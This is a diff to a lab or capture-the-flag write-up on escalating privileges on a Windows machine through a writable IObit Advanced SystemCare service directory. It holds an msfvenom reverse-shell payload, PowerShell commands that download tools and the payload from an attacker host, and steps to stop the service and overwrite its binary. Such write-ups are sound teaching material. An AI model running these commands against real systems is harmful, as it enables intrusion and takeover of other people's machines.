@@ -189,14 +189,14 @@ sudo systemctl stop <service_name>
 
 ![](images/4f4ee69bfe895cf3acbc23913a5d199e_MD5.png)
 
-Next step is to start a python server in the directory as our netcat binary. When the exploit is ran it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to that the specified port 4443 in order catch the shell.
+Next step is to start a python server in the directory as our netcat binary. When the exploit is ran it will need a server hosting the file in order to transfer it to the target machine. We will then run the exploit a second time to execute the file and gain a shell once our netcat listener is set to that the specified port which in my case was **4443** in order catch the shell.
 
 ![](images/20230913141304.png)
 Next step is to transfer a winPEAS script to autotmate our Privilege Escalation Enumeration and then run the script.
 
 Command to transfer the script form our attack machine to our target machine:
 ```powershell
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.129.243:80/winPEASx64.exe', 'C:\\Windows\temp\winPEASx64.exe')"
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/winPEASx64.exe', 'C:\\Windows\temp\winPEASx64.exe')"
 ```
 Command to execute the script:
 ```powershell
@@ -205,26 +205,26 @@ Command to execute the script:
 
 ![](images/20230913141953.png)
 
-Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  that we have write access to `C:\Program Files (x86)\IObit\Advanced SystemCare\`.
+Now lets take a look at our winPEAS scan. We can see that there is an Unquoted service path  and that we have write access to `C:\Program Files (x86)\IObit\Advanced SystemCare\`
 In that directory there is a service executable "ASCService.exe" that we can abuse by replacing this with a malicious file which will give us a reverse shell.
 
 ![](images/20230913142635.png)
  All we need to do is to create a windows reverse shell payload  using msfvenom and save it into a file with the same name as the service "ASSCService.exe". Then in order to upload and replace the legitimate file with our malicious payload file we need to first of all stop the **AdvancedSystemCareService9** service, then upload our payload into the same directory in order to overwrite the existing file.
 
-Let's first create our payload:
+Let's first create our payload using msfvenom:
 ```shell
-msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
 ```
 
 ![](images/20230913100821.png)
- Now lets stop the **AdvancedSystemCareService9**:
+ Now lets stop the service  **AdvancedSystemCareService9**:
 ```shell
 powershell -c "Stop-Service -Name 'AdvancedSystemCareService9' -Force"
 ```
 
 And now transfer our payload to overwrite the file:
 ```shell
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.129.243:80/ASCService.exe', 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/ASCService.exe', 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe')"
 ```
 
 Setup a netcat listener and start the service:
